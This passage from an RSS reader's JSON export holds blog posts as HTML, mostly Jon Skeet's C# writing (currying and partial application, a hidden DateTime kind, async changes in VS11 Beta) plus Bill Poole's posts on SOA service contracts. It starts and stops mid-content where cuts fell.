function (method) taking a very small number of parameters, I've chosen to use 3 for clarity. Although my methods to perform the currying and partial function application will be generic (so all the types of parameters and return value are arbitrary) I'm using a simple function for demonstration purposes:</p><div class=\"code\"><span class=\"Modifier\">static</span> <span class=\"ReferenceType\">string</span>SampleFunction(<span class=\"ValueType\">int</span>a,<span class=\"ValueType\">int</span>b,<span class=\"ValueType\">int</span>c) <br />{ <br />   <span class=\"Statement\">return</span> <span class=\"ReferenceType\">string</span>.Format(<span class=\"String\">\"a={0}; b={1}; c={2}\"</span>, a, b, c); <br />}</div><p>So far, so simple. There's<em>nothing tricky</em>about that method, so don't look for anything surprising.</p><h3>What's it all about?</h3><p>Both currying and partial function application are about converting one sort of function to another. We'll use delegates as an approximation to functions, so if we want to treat the method SampleFunction as a value, we can write:</p><div class=\"code\">Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; function = SampleFunction;</div><p>This single line is useful for two reasons:</p><ul><li>Assigning the value to a variable hammers home the point that it really is a value. A delegate instance is an object much like any other, and the value of the function variable is a reference just like any other.</li><li>Method group conversions (using just the name of the method as a way of creating a delegate) doesn't work terribly nicely with type inference when calling a generic method.</li></ul><p>We can already call the function using three arguments with no further work:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>result = function(1, 2, 3);</div><p>Or equivalently:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>result = function.Invoke(1, 2, 3);</div><p>(The C# compiler just converts the shorthand of the first form to the second. The IL emitted will be the same.)</p><p>That's fine if we've got all the arguments available at the same time, but what if we haven't? To give a concrete (if somewhat contrived) example, suppose we have a logging function with three parameters (source, severity, message) and within a single class (which I'll call BusinessLogic for the moment) we always want to use the same value for the\"source\" parameter, and we'd like to be able to log easily everywhere in the class specifying just the severity and message. We have a few options:</p><ul><li>Create an adapter class which takes the log function (or more generally a logging object) and the\"source\" value in its constructor, stashes both in instance variables, and exposes a method with two parameters. That method just delegates to the stashed logger, using the source it's remembered to supply the first argument to the three-parameter method. In BusinessLogic we create an instance of the adapter class, and stash a reference in an instance variable - then just call the two-parameter method everywhere we need to. This is probably overkill if we only need the adapter from BusinessLogic, but it's reusable... so long as we're trying to adapt the same logging function.</li><li>Store the original logger in our BusinessLogic class, but create a helper method with two parameters. This can hard-code the value used for the\"source\" parameter in one place (the helper method). If we need to do this in several places, it gets annoying.</li><li>Use a more general functional programming approach - probably<em>partial function application</em>in this case.</li></ul><p>I'm deliberately ignoring the discrepancy between holding a reference to\"the logger\" and holding a reference to\"the logging function\". Obviously there's a significant difference if we need to use more than one function from the logging class, but for the purposes of thinking about currying and partial function application, we'll just think of\"a logger\" as\"a function taking three parameters\" (like our sample function).</p><p>Now that I've given the slightly-real-world concrete example for a bit of motivation, I'm going to ignore it for the rest of the post, and just talk about our sample function. I don't want to write a whole BusinessLogic class which pretends to do something useful; I'm sure you can perform the appropriate mental conversion from\"the sample function\" to\"something I might actually want to do\".</p><h3>Partial Function Application</h3><p>The purpose of partial function application is to take a function with N parameters and a value for one of those parameters, and return a function with N-1 parameters, such that calling the result will assemble all the required values appropriately (the 1 argument given to the partial application operation itself, and the N-1 arguments given to the returned function). So in code form, these two calls should be equivalent for our 3-parameter method:</p><div class=\"code\"><span class=\"InlineComment\">// Normal call</span><br /><span class=\"ReferenceType\">string</span>result1 = function(1, 2, 3);<br /><br /><span class=\"InlineComment\">// Call via partial application</span><br />Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; partialFunction = ApplyPartial(function, 1); <br /><span class=\"ReferenceType\">string</span>result2 = partialFunction(2, 3);</div><p>In this case I've implemented partial application with a single parameter, and chosen the first one - you<em>could</em>write an ApplyPartial method which took more arguments to apply, or which used them somewhere else in the final function execution. I believe that picking off parameters one at a time, from the start, is the most conventional approach.</p><p>Thanks to anonymous functions (a lambda expression in this case, but an anonymous method wouldn't be much more verbose), the implementation of ApplyPartial is simple:</p><div class=\"code\"><span class=\"Modifier\">static</span>Func&lt;T2, T3, TResult&gt; ApplyPartial&lt;T1, T2, T3, TResult&gt;<br />    (Func&lt;T1, T2, T3, TResult&gt; function, T1 arg1) <br />{ <br />   <span class=\"Statement\">return</span>(b, c) =&gt; function(arg1, b, c); <br />}</div><p>The generics make the method look more complicated than it really is. Note that the lack of higher order types in C# means that you'd need a method like this for<em>every</em>delegate you wanted to use - if you wanted a version for a function which started with four parameters, you'd need an ApplyPartial&lt;T1, T2, T3, T4, TResult&gt; method etc. You'd probably also want a parallel set of methods for the Action delegate family.</p><p>The final thing to note is that assuming we had all of these methods, we could perform partial function application again - even potentially down to a parameterless function if we wanted, like this:</p><div class=\"code\">Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; partial1 = ApplyPartial(function, 1); <br />Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; partial2 = ApplyPartial(partial1, 2); <br />Func&lt;<span class=\"ReferenceType\">string</span>&gt; partial3 = ApplyPartial(partial2, 3); <br /><span class=\"ReferenceType\">string</span>result = partial3();</div><p>Again, only the final line would actually invoke the original function.</p><p>Okay, so that's partial function application. That's<em>relatively</em>straightforward. Currying is slightly harder to get your head round, in my view.</p><h3>Currying</h3><p>Whereas partial function application converts a function with N parameters into a function with N-1 parameters by applying one argument, currying effectively decomposes the function into functions taking a single parameter. We don't pass any arguments into the Curry method itself:</p><ul><li>Curry(f) returns a function f1 such that...</li><li>f1(a) returns a function f2 such that...</li><li>f2(b) returns a function f3 such that...</li><li>f3(c) invokes f(a, b, c)</li></ul><p>(Again, note that this is specific to our three-parameter function - but hopefully it's obvious how it would extend to other signatures.)</p><p>To give our\"equivalence\" example again, we can write:</p><div class=\"code\"><span class=\"InlineComment\">// Normal call</span><br /><span class=\"ReferenceType\">string</span>result1 = function(1, 2, 3);<br /><br /><span class=\"InlineComment\">// Call via currying</span><br />Func&lt;<span class=\"ValueType\">int</span>, Func&lt;<span class=\"ValueType\">int</span>, Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt;&gt;&gt; f1 = Curry(function); <br />Func&lt;<span class=\"ValueType\">int</span>, Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt;&gt; f2 = f1(1); <br />Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; f3 = f2(2); <br /><span class=\"ReferenceType\">string</span>result2 = f3(3);<br /><br /><span class=\"InlineComment\">// Or to do make all the calls together...</span><br /><span class=\"Linq\">var</span>curried = Curry(function); <br /><span class=\"ReferenceType\">string</span>result3 = curried(1)(2)(3);</div><p>The difference between the latter examples shows one reason why functional languages often have good type inference and compact representations of function types: that declaration of f1 is pretty fearsome.</p><p>Now that we know what the Curry method is meant to do, it's actually surprisingly simple to implement. Indeed, all we need to do is translate the bullet points above into lambda expressions. It's a thing of beauty:</p><div class=\"code\"><span class=\"Modifier\">static</span>Func&lt;T1, Func&lt;T2, Func&lt;T3, TResult&gt;&gt;&gt; Curry&lt;T1, T2, T3, TResult&gt; <br />    (Func&lt;T1, T2, T3, TResult&gt; function) <br />{ <br />   <span class=\"Statement\">return</span>a =&gt; b =&gt; c =&gt; function(a, b, c); <br />}</div><p>If you want to add some brackets to make it clearer for you, feel free - personally I think it just adds clutter. Either way, we get what we want. (It's worth thinking about how annoying it would be to write that without lambda expressions or anonymous methods. Not<em>hard</em>, just annoying.)</p><p>So that's currying. I think. Maybe.</p><h3>Conclusion</h3><p>I can't say I've ever knowingly used currying, whereas I suspect some bits of<a href=\"http://noda-time.googlecode.com\">Noda Time</a>'s text parsing effectively use partial functional application. (If anyone really wants me to dig in and check, I'll do so.)</p><p>I really hope I've got the difference between them right here - it<em>feels</em>right, in that the two are clearly related, but also quite distinct. Now that we've reached the end, think about how that difference manifests itself when there are only two parameters, and hopefully you'll see why I chose to use three :)</p><p>My gut feeling is that currying is a more useful concept in an academic context, whereas partial functional application is more useful in practice. However, that's the gut feeling of someone who hasn't really used a functional language in anger. If I ever<em>really</em>get round to using F#, maybe I'll do a follow-up post. For now, I'm hoping that my trusty smart readers can provide useful thoughts for others.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1805414\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/jeibq6H-CdU\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1293}}
{"k":"0000000084","o":"0000003188","v":"001"}
{"_id":1294,"_uid":1294,"_dt":1373742620982,"_s":"f1a709f53c51f8c496ab0474a18aea86"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/iLSsE2XOeCI/stack-overflow-and-personal-emails.aspx","title":"Stack Overflow and personal emails","published":{"$wrap":"$date","v":1345657884000,"h":"2012-08-22T17:51:24.000Z"},"starred":false,"read":false,"content":"<p>This post is partly meant to be a general announcement, and partly meant to be something I can point people at in the future (rather than writing a short version of this on each email).</p><p>These days, I get at least a few emails practically<em>every day</em>along the lines of:</p><p>\"I saw you on Stack Overflow, and would like you to answer this development question for me...\"</p><p>It's clear that the author:</p><ul><li>Is aware of Stack Overflow</li><li>Is aware that Stack Overflow is a site for development Q&A</li><li>Is aware that I answer questions on Stack Overflow</li></ul><p>... and yet they believe that the right way of getting me to answer a question is by emailing it to me directly. Sometimes it's a link to a Stack Overflow question, sometimes it's the question asked directly in email.</p><p>In the early days of Stack Overflow, this wasn't too bad. I'd get maybe one email like this a week. Nowadays, it's simply too much.</p><p>If you have a question worthy of Stack Overflow, ask it on Stack Overflow. If you've been banned from asking questions due to asking too many low-quality ones before, then I'm unlikely to enjoy answering your questions by email - learn<a href=\"http://tinyurl.com/so-hints\">what makes a good question</a>instead, and edit your existing questions.</p><p>If you've already asked the question on Stack Overflow, you should consider why you think it's more worthy of my attention than everyone else's questions. You should also consider what would happen if<em>everyone</em>who would like me to answer a question decided to email me.</p><p>Of course in<em>some</em>cases it's appropriate. If you've already asked a question, written it as well as you can, waited a while to see if you get any answers naturally,<em>and</em>if it's in an area that you know I'm particularly experienced in (read: the C# language, basically) then that's fine. If your question is about something from C# in Depth - a snippet which doesn't work or some text you don't understand, for example - then it's entirely appropriate to mail me directly.</p><p>Basically, ask yourself whether you think I will actually welcome the email. Is it about something you know I'm specifically interested in? Or are you just trying to get more attention to a question, somewhat like jumping a queue?</p><p>I'm aware that it's possible this post makes me look either like a grumpy curmudgeon or (worse) like an egocentric pseudo-celebrity. The truth is I'm just like everyone else, with very little time on my hands - time I'd like to spend as usefully and fairly as possible.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1815372\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/iLSsE2XOeCI\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1294}}
{"k":"0000000084","o":"0000013206","v":"001"}
{"_id":1295,"_uid":1295,"_dt":1373742620983,"_s":"9ff376a449c5e1144219f264d47222d6"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/tSO4uPGTVe4/more-fun-with-datetime.aspx","title":"More fun with DateTime","published":{"$wrap":"$date","v":1335989563000,"h":"2012-05-02T20:12:43.000Z"},"starred":false,"read":false,"content":"<p>(Note that this is deliberately not posted in the<a href=\"http://noda-time.blogspot.com/\">Noda Time blog</a>. I reckon it's of wider interest from a design perspective, and I won't be posting any of the equivalent<a href=\"http://noda-time.googlecode.com\">Noda Time</a>code. I'll just say now that we don't have this sort of craziness in Noda Time, and leave it at that...)</p><p>A few weeks ago, I was answering a Stack Overflow question when I noticed an operation around dates and times which<em>should</em>have been losing information apparently not doing so. I investigated further, and discovered some\"interesting\" aspects of both DateTime and TimeZoneInfo. In an effort to keep this post down to a readable length (at least for most readers; certain WebDriver developers who shall remain nameless have probably given up by now already) I'll save the TimeZoneInfo bits for another post.</p><h2>Background: daylight saving transitions and ambiguous times</h2><p>There's one piece of<em>inherent</em>date/time complexity you'll need to understand for this post to make sense: sometimes, a local date/time occurs twice. For the purposes of this post, I'm going to assume you're in the UK time zone. On October 28th 2012, at 2am local time (1am UTC), UK clocks will go back to 1am local time. So 1:20am local time occurs twice - once at 12:20am UTC (in daylight saving time, BST), and once at 1:20am UTC (in standard time, GMT).</p><p>If you want to run any of the code in this post and you're<em>not</em>in the UK, please adjust the dates and times used to a similar ambiguity for when your clocks go back. If you happen to be in a time zone which doesn't observe daylight savings, I'm afraid you'll have to adjust your system time zone in order to see the effect for yourself.</p><h2>DateTime.Kind and conversions</h2><p>As you may already know, as of .NET 2.0, DateTime has a<a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.kind.aspx\">Kind</a>property, of type<a href=\"http://msdn.microsoft.com/en-us/library/shx7s921.aspx\">DateTimeKind</a>- an enum with the following values:</p><ul><li>Local: The DateTime is considered to be in the<em>system time zone</em>. Not an arbitrary\"local time in some time zone\", but in the specific current system time zone.</li><li>Utc: The DateTime is considered to be in UTC (corollary: it always unambiguously represents an instant in time)</li><li>Unspecified: This means different things in different contexts, but it's a sort of\"don't know\" kind; this is closer to\"local time in some time zone\" which is represented as LocalDateTime in Noda Time.</li></ul><p>DateTime provides three methods to convert between the kinds:</p><ul><li><a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.touniversaltime.aspx\">ToUniversalTime</a>: if the original kind is Local or Unspecified, convert it from local time to universal time in the system time zone. If the original kind is Utc, this is a no-op.</li><li><a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.tolocaltime.aspx\">ToLocalTime</a>: if the original kind is Utc or Unspecified, convert it from UTC to local time. If the original kind is Local, this is a no-op.</li><li><a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.specifykind.aspx\">SpecifyKind</a>: keep the existing date/time, but<em>just</em>change the kind. (So 7am stays as 7am, but it changes the<em>meaning</em>of that 7am effectively.)</li></ul><p>(Prior to .NET 2.0, ToUniversalTime and ToLocalTime were already present, but always<em>assumed</em>the original value needed conversion - so if you called x.ToLocalTime().ToLocalTime().ToLocalTime() the result would probably end up with the appropriate offset from UTC being applied three times!)</p><p>Of course, none of these methods change the existing value - DateTime is immutable, and a value type - instead, they return a<em>new</em>value.</p><h2>DateTime's Deep Dark Secret</h2><p>(The code in this section is presented in several chunks, but it forms a single complete piece of code - later chunks refer to variables in earlier chunks. Put it all together in a Main method to run it.)</p><p>Armed with the information in the previous sections, we should be able to make DateTime lose data. If we start with 12:20am UTC and 1:20am UTC on October 28th as DateTimes with a kind of Utc, when we convert them to local time (on a system in the UK time zone) we should get 1:20am in both cases due to the daylight saving transition. Indeed, that works:</p><div class=\"code\"><span class=\"InlineComment\">// Start with different UTC values around a DST transition</span><br /><span class=\"Linq\">var</span>original1 =<span class=\"Keyword\">new</span>DateTime(2012, 10, 28, 0, 20, 0, DateTimeKind.Utc);<br /><span class=\"Linq\">var</span>original2 =<span class=\"Keyword\">new</span>DateTime(2012, 10, 28, 1, 20, 0, DateTimeKind.Utc);<br /><br /><span class=\"InlineComment\">// Convert to local time</span><br /><span class=\"Linq\">var</span>local1 = original1.ToLocalTime();<br /><span class=\"Linq\">var</span>local2 = original2.ToLocalTime();<br /><br /><span class=\"InlineComment\">// Result is the same for both values. Information loss?</span><br /><span class=\"Linq\">var</span>expected =<span class=\"Keyword\">new</span>DateTime(2012, 10, 28, 1, 20, 0, DateTimeKind.Local);<br />Console.WriteLine(local1 == expected);<span class=\"InlineComment\">// True</span><br />Console.WriteLine(local2 == expected);<span class=\"InlineComment\">// True</span><br />Console.WriteLine(local1 == local2);  <span class=\"InlineComment\">// True</span></div><p>If we've started with two<em>different</em>values, applied the same operation to both, and ended up with equal values, then we must have lost information, right? That doesn't mean that operation is\"bad\" any more than\"dividing by 2\" is bad. You ought to be aware of that information loss, that's all.</p><p>So, we ought to be able to demonstrate that information loss further by converting back from local time to universal time. Here we have the opposite problem: from our local time of 1:20am, we have<em>two</em>valid universal times we could convert to - either 12:20am UTC or 1:20am UTC. Both answers would be correct - they are universal times at which the local time would be 1:20am. So which one will get picked? Well... here's the surprising bit:</p><div class=\"code\"><span class=\"InlineComment\">// Convert back to UTC</span><br /><span class=\"Linq\">var</span>roundTrip1 = local1.ToUniversalTime(); <br /><span class=\"Linq\">var</span>roundTrip2 = local2.ToUniversalTime();<br /><br /><span class=\"InlineComment\">// Values round-trip correctly! Information has been recovered...</span><br />Console.WriteLine(roundTrip1 == original1); <span class=\"InlineComment\">// True</span><br />Console.WriteLine(roundTrip2 == original2); <span class=\"InlineComment\">// True</span><br />Console.WriteLine(roundTrip1 == roundTrip2);<span class=\"InlineComment\">// False</span></div><p>Somehow, each of the local values<em>knows</em>which universal value it came from. The The information has been recovered, so the reverse conversion round-trips each value back to its original one. How is that possible?</p><p>It turns out that DateTime actually has<em>four</em>potential kinds: Local, Utc, Unspecified, and\"local but treat it as the earlier option when resolving ambiguity\". A DateTime is really just a 64-bit number of ticks, but because the range of DateTime is only January 1st 0001 to December 31st 9999. That range can be represented in 62 bits, leaving 2 bits\"spare\" to represent the kind. 2 bits gives 4 possible values... the three documented ones and the shadowy extra one.</p><p>Through experimentation, I've discovered that the kind is preserved if you perform arithmetic on the value, too... so if you go to another\"fall back\" DST transition such as October 30th 2011, the ambiguity resolution works the same way as before:</p><div class=\"code\"><span class=\"Linq\">var</span>local3 = local1.AddYears(-1).AddDays(2); <br /><span class=\"Linq\">var</span>local4 = local2.AddYears(-1).AddDays(2);        <br />Console.WriteLine(local3.ToUniversalTime().Hour);<span class=\"InlineComment\">// 0</span><br />Console.WriteLine(local4.ToUniversalTime().Hour);<span class=\"InlineComment\">// 1</span></div><p>If you use DateTime.SpecifyKind with DateTimeKind.Local, however, it goes back to the\"normal\" kind, even though it<em>looks</em>like it should be a no-op:</p><div class=\"code\"><span class=\"InlineComment\">// Should be a no-op?</span><br /><span class=\"Linq\">var</span>local5 = DateTime.SpecifyKind(local1, local1.Kind); <br />Console.WriteLine(local5.ToUniversalTime().Hour);<span class=\"InlineComment\">// 1</span></div><p>Is this correct behaviour? Or should it be a no-op, just like calling ToLocalTime on a\"local\" DateTime is? (Yes, I've checked - that doesn't lose the information.) It's hard to say, really, as this whole business appears to be undocumented... at least, I haven't seen anything in MSDN about it. (Please add a link in the comments if you find something. The behaviour actually goes against what's documented, as far as I can tell.)</p><p>I haven't looked into whether various forms of serialization preserve values like this faithfully, by the way - but you'd have to work hard to reproduce it in non-framework code. You can't explicitly construct a DateTime with the\"extra\" kind; the only ways I know of to create such a value are via a conversion to local time or through arithmetic on a value which already has the kind. (Admittedly if you're serializing a DateTime with a Kind of Local, you're already on potentially shaky ground, given that you could be deserializing it on a machine with a different system time zone.)</p><h2>Unkind comparisons</h2><p>I've misled you a little, I have to admit. In the code above, when I compared the\"expected\" value with the results of the first conversions, I deliberately specified DateTimeKind.Local in the constructor call. After all, that's the kind we<em>do</em>expect. Well, yes - but I then printed the result of comparing this value with local1 and local2... and those comparisons would have been the same regardless of the kind I'd specified in the constructor.</p><p>All comparisons between DateTimes ignore the Kind property. It's not just restricted to equality. So for example, consider this comparison:</p><div class=\"code\"><span class=\"InlineComment\">// In June: Local time is UTC+1, so 8am UTC is 9am local</span><br /><span class=\"Linq\">var</span>dt1 =<span class=\"Keyword\">new</span>DateTime(2012, 6, 1, 8, 0, 0, DateTimeKind.Utc); <br /><span class=\"Linq\">var</span>dt2 =<span class=\"Keyword\">new</span>DateTime(2012, 6, 1, 8, 30, 0, DateTimeKind.Local); <br />Console.WriteLine(dt1&lt; dt2);<span class=\"InlineComment\">// True</span></div><p>When viewed in terms of\"what instants in time do these both represent?\" the answer here is wrong - when you convert both values into the same time zone (in either direction), dt1 occurs<em>after</em>dt2. But a simple look at the properties tells a different story. In practice, I suspect that most comparisons between DateTime values of different kinds involve code which is at best sloppy and is quite possibly broken in a meaningful way.</p><p>Of course, if you bring Kind=Unspecified into the picture, it becomes impossible to compare meaningfully in a kind-sensitive way. Is 12am UTC before or after 1am Unspecified? It depends what time zone you later use.</p><p>To be clear, it<em>is</em>a hard-to-resolve issue, and one that we don't do terribly well at in Noda Time at the moment for ZonedDateTime. (And even with just LocalDateTime you've got issues between calendars.) This is a situation where providing separate Comparer&lt;T&gt; implementations works nicely - so you can explicitly say what kind of comparison you want.</p><h2>Conclusions</h2><p>There's more fun to be had with a similar situation when we look at TimeZoneInfo, but for now, a few lessons:</p><ul><li>Giving a type different\"modes\" which make it mean fairly significantly different things is likely to cause headaches</li><li>Keeping one of those modes secret (and preventing users from even constructing a value in that mode directly) leads to even more fun and games</li><li>If two instances of your type are considered\"equal\" but behave differently, you should at least consider whether there's something smelly going on</li><li>There's<em>always</em>more fun to be had with DateTime...</li></ul><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1809416\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/tSO4uPGTVe4\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1295}}
{"k":"0000000084","o":"0000003700","v":"001"}
{"_id":1296,"_uid":1296,"_dt":1373742620983,"_s":"4bee3c1c79e924dc0374269d1ea3cd38"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/2d3e4hW4sA4/service-contract-stability.html","title":"Service Contract Stability","published":{"$wrap":"$date","v":1215441900002,"h":"2008-07-07T14:45:00.002Z"},"starred":false,"read":false,"content":"SOA as a style of architecture reduces coupling between services by mandating that services have no knowledge of each other's implementations.  Services communicate only by way of exchanging messages that conform to service contracts.  As such, service consumers are dependent only on a service provider's service contract, not its implementation.<br /><br />However if we do not take particular care in designing our service boundaries and responsibilities, and by extension its service contract, then we run the risk that our service contracts may themselves be highly dependent on a service's implementation. One such example of this is<a href=\"http://bill-poole.blogspot.com/2008/05/whitebox-services-are-bad.html\">white box services</a>.<br /><br />Consequently, we want to align our service contracts with concepts that are very stable.  With a<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>, services are exposed somewhat arbitrarily.  They do not contribute towards any defined broader architecture.  Therefore service contracts will have an arbitrary level of stability.<br /><br />Next on the list is<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>.  With this approach, service contracts are centred around applications.  They are expressed in terms of the application with which we are integrating.  Consequently if the scope of the application changes, or the application itself is exchanged for another (such as exchanging an Onyx CRM with MS CRM), the service contract is very likely to change.<br /><br />So what about<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">layered service models</a>?  In this case, we have atomic business tasks, business processes and data stores abstracted as services.  These concepts are not at all stable.  Businesses very often make changes in business processes that in turn require changes in how atomic business activities are defined and how data is represented.  With this approach we are very likely to find ourselves changing our service contracts as business processes are updated.<br /><br />But what about business capabilities?  Business capabilities are by their very nature incredibly stable.  Although a retail organisation may make regular changes as to<i>how</i>it goes about inventory management, the fact is that it will<i>always</i>have an inventory management capability.  Moreover, other capabilities within the enterprise don't care<i>how</i>inventory management is performed.  They only care that it<i>is</i>performed.<br /><br />Consequently, aligning our service boundaries (and by extension our service contracts) with business capabilities gives us an incredible amount of stability.  This is the basis of the self-contained process centric-service model introduced in an<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">earlier post</a>.<br /><br />By defining our services around business capabilities we achieve greater business agility by way of being able to update<i>how</i>business functions are performed without influencing other services in our enterprise.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/2d3e4hW4sA4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1296}}
{"k":"0000000084","o":"0000003627","v":"001"}
{"_id":1297,"_uid":1297,"_dt":1373742620983,"_s":"7562d4ea741702f5425d39461d79d3e9"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/HFWv5ergm4U/anatomy-of-service-part-i.html","title":"The Anatomy of a Service (Part I)","published":{"$wrap":"$date","v":1224170340002,"h":"2008-10-16T15:19:00.002Z"},"starred":false,"read":false,"content":"It occurred to me that to date I've been heavily focussed on defining SOA, techniques for defining service boundaries, contracts and responsibilities, and the various flavours of SOA that we see in the wild, without giving much attention to what goes on<i>inside</i>the service boundary.  So I thought it appropriate to begin a series of blog posts on the anatomy of a service.<br /><br />So let us begin by restating the definition of a service.  A service (in the context of SOA) is an autonomous coarse grained unit of logic that exposes functionality by way of exchanging messages conforming to its service contract with service consumers via its endpoints.<br /><br />The service contract describes the syntax (not semantics) of messages exchanged via each service endpoint, as well as the means by which messages are carried between each endpoint and service consumers.  Each endpoint is located and uniquely identified by its address.<br /><br />A service provider may also consume other services, and a service consumer may in fact also be a service provider.  As such, the terms<i>service provider</i>and<i>service consumer</i>describe roles in a specific interaction.  The rules governing communication with a service are described by its policy.<br /><br />What do we mean when we say a service is autonomous?  Well we mean a few things actually.  Firstly, services are in control of their own state.  Services are not<i>instantiated</i>by their consumers.  A service exists as a single autonomous entity.<br /><br />Secondly, we mean that services may be under different ownership domains.  Those parties responsible for the service and its management may very likely be different to those responsible for other services.  Services may be versioned and deployed independently of each other.<br /><br />And thirdly, we mean that services should not be dependent upon the availability of other services in order to function without failure - even if that is in some limited capacity.<br /><br />I'd also like to point out that there is the view that a service contract should<i>not</i>be devoid of semantic definition.  There is the thinking that a service contract should also describe the semantics of the messages exchanged by the service, as well as the state the expected behaviour of the service.<br /><br />Okay so now we've defined a service, what does a service look like?  Well that's the beauty of SOA - because service implementations are encapsulated within their service boundaries, consumers don't (or shouldn't anyway) have any visibility or knowledge of the service provider's implementation.<br /><br />But that doesn't really help us much as architects that need to design these things.  That's the reason for this series of blog posts.  We as architects need to understand the different ways to go about designing services - not just their boundaries and responsibilities, but their implementations as well.<br /><br />Over the next few posts I intend to go through various different flavours of service anatomy in order to bring some clarity to the various options that exist for implementing services.  So stay tuned!<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/HFWv5ergm4U\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1297}}
{"k":"0000000084","o":"0000021693","v":"001"}
{"_id":1298,"_uid":1298,"_dt":1373742620984,"_s":"6ff1e7df4ee50e2711fae498edcce76d"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/RJXvEh-Qhn4/eduasync-20-changes-between-the-vs11-preview-and-the-visual-studio-11-beta.aspx","title":"Eduasync 20: Changes between the VS11 Preview and the Visual Studio 11 Beta","published":{"$wrap":"$date","v":1331063694000,"h":"2012-03-06T19:54:54.000Z"},"starred":false,"read":false,"content":"<p>A while I ago I<a href=\"http://msmvps.com/blogs/jon_skeet/archive/2012/01/12/eduasync-part-18-changes-between-the-async-ctp-and-the-visual-studio-11-preview.aspx\">blogged about</a>what had changed under the hood of async between the CTP and the VS11 Preview. Well, now that the VS11 Beta is out, it's time to do it all again...</p><p>Note that the code in this post<em>is</em>in the<a href=\"http://eduasync.googlecode.com\">Eduasync codebase</a>, under a different solution (Eduasync VS11.sln). Many of the old existing projects won't compile with VS11 beta, but I'd rather leave them as they are for posterity, showing the evolution of the feature.</p><p>Stephen Toub has an<a href=\"http://blogs.msdn.com/b/pfxteam/archive/2012/02/29/10274035.aspx\">excellent blog post</a>covering some of this, so while I'll<em>mention</em>things he's covered, I won't go into much detail about them. Let's start off there though...</p><p>(EDIT: Stephen has also mailed me with some corrections, which I've edited in - mostly without indication, as the post has been up for less than seven hours, and it'll make for a better reading experience.)</p><h2>Awaiter pattern changes</h2><p>The awaiter pattern is now not<em>just</em>a pattern. The IsCompleted property and GetResult method are still\"loose\" but<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.inotifycompletion.oncompleted(v=vs.110).aspx\">OnCompleted</a>is now part of an interface:<a href=\"http://msdn.microsoft.com/en-us/library/hh472348(v=vs.110).aspx\">INotifyCompletion</a>. Awaiters<em>have</em>to implement INotifyCompleted, but may<em>also</em>implement<a href=\"http://msdn.microsoft.com/en-us/library/hh472362(v=vs.110).aspx\">ICriticalNotifyCompletion</a>and its<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.icriticalnotifycompletion.unsafeoncompleted(v=vs.110).aspx\">UnsafeOnCompleted</a>method.</p><p>The OnCompleted method is just as it was before, and needs to flow the execuction context; the UnsafeOnCompleted method is simpler, as it<em>doesn't</em>need to flow the execution context. All of this only matters if you're implementing your own awaiters, of course. (More details in Stephen's blog post. I've found this area somewhat confusing, so please do read his post carefully!)</p><h2>Skeleton method changes</h2><p>Just as I have previously, I'm using the (entirely unofficial) term\"skeleton method\" to mean the very short method created by the compiler with the same signature as an async method: this is the entry point to the async method, effectively, which creates and starts the state machine containing all the<em>real</em>logic.</p><p>There are two changes I've noticed in the skeleton method. Firstly, for some reason the state machine state numbers have changed. Whereas previously a state number of 0 meant\"initial or running\", positive values meant\"between calls, or navigating back to the await expression\" and -1 meant\"finished\", now -1 means\"initial or running\", non-negative means\"between calls, or navigating back to await expression\" and -2 means\"finished\". It's not clear why this change has been made, given that it requires an extra assignment at the start of every skeleton method (to set the state to -1).</p><p>More importantly, the skeleton method no longer calls MoveNext directly on the state machine that it's built. Instead, it calls<a 